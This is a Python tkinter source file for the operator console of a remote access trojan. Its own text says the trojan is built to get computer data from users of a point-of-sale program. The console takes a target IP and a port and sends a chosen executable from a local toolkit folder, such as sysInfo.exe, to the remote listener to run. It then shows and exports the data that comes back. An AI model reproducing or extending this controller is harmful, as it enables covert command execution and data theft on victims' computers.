#Import essential modules for the GUI to run successfully 
from netconnect import *	#netconnect is a house built class designed for this program
from tkinter import ttk		#tkinter runs the GUI
import tkinter as tk
import glob			#glob is used to locate files
import datetime			#datetime is used for the naming convention of the files
import socket			#socket is an essential module for network connectivity
import time			#Used to pause the program to allow time for communication between client and server


#Start of the GUI class
class GUI:
    #__init__ is used to define required objects for the class to run
    def __init__(self,master):
        self.__master = master
        self.__master.title("Client")
        self.__master.geometry("800x600")


        #Labels used for tkinter GUI
        self.__label1 = tk.Label(self.__master,text="Enter IP Address:",font=('Arial',18))
        self.__label2 = tk.Label(self.__master, text="Enter Port:", font=('Arial', 18))
        self.__label3 = tk.Label(self.__master,text="Returned Message: ",font=('Arial',18))
        self.__label4 = tk.Label(self.__master, text="OPTIONS", font=('Arial', 18))

        #Entries used for tkinter GUI
        self.__entry1 = tk.Entry(bd=5)  #bd=5 gives a slight 3D look
        self.__entry2 = tk.Entry(bd=5)
        self.__entry2.insert(tk.END, '5555')   #Defualt port of 5555. Server designed for this program listens on port 5555

        #Buttons used for tkinter GUI
        self.__button1 = tk.Button(text="Test Connection",command=self.connect,bd=5)
        self.__button2 = tk.Button(text="Export to Text File", command=self.export, bd=5)
        self.__button3 = tk.Button(text="RUN", command=self.run, bd=5)

        #Text field used for tkinter GUI
        self.__text1 = tk.Text(master=self.__master,height=10,width=90,bd=5)
        self.__text1.insert('1.0', 'This is a RAT designed to get computer data from a user running our POS program.\n\n')

        #Combobox used for tkinter GUI
        self.__cb1 = ttk.Combobox(self.__master,values=self.combo_box_function()) #Combobox will will menu items from the function defined
        self.__cb1.set('--Select--')    #Default value for combox. '--Select--' prompts user to select a program to run on the server.

        #This is the pack order to ensure an organized GUI
        self.__label1.pack()
        self.__entry1.pack(ipadx=100, ipady=5) #ipadx and ipady is gives internal padding. Otherwise, default padding is 0
        self.__label2.pack()
        self.__entry2.pack(ipadx=100, ipady=5)
        self.__button1.pack()
        self.__label3.pack()
        self.__text1.pack()
        self.__button2.pack()
        self.__label4.pack()
        self.__cb1.pack()
        self.__button3.pack()


    #This function populates the entries for the combobox
    def combo_box_function(self):
        toolkit = glob.glob('toolkit/*')    #Entries for the combobox will be the files in the toolbox directory
        files = []
        for i in toolkit:
            files.append(i[8:])             #8 is used as the starting index value to skip 'toolkit/' value
        return files

    #This will use the ip that is specified by the user in entry1
    def get_ip(self):
        string = str(self.__entry1.get())
        return string

    def get_port(self):
        string = str(self.__entry2.get())
        return string

    #This function is for the connect button. It will verify communication with the server side
    def connect(self):
        host = self.get_ip()
        port = self.get_port()
        connect = NetConnect(host, port)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        connect.client()
        self.display_text()

    #This function is for the run button. It will run the specified program in the combobox on the server side.
    def run(self):
        host = self.get_ip()
        port = self.get_port()
        connect = NetConnect(host, port)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        message = self.__cb1.get()
        connect.client(message)
        self.display_text()

    #The export button will export the data in the text field to a text file. 
    def export(self):
        name = f'{datetime.datetime.now().strftime("%Y-%m-%d %H_%M_%S")}.txt'
        file = open(name,'w')
        text = open('text.txt')
        file.write(text.read())
        file.close()

    #This function will display text from the file of which the listener wrote the ouput
    def display_text(self):
        self.clear_text()
        if self.__cb1.get() == 'sysInfo.exe':
            time.sleep(7)
        else:
            time.sleep(0.5)
        file = open('text.txt')
        file_read = file.read()
        self.__text1.insert(tk.END, file_read)

    #This function clears the data in the text box. The display_text function calls on this function.
    def clear_text(self):
        self.__text1.delete(1.0,tk.END)


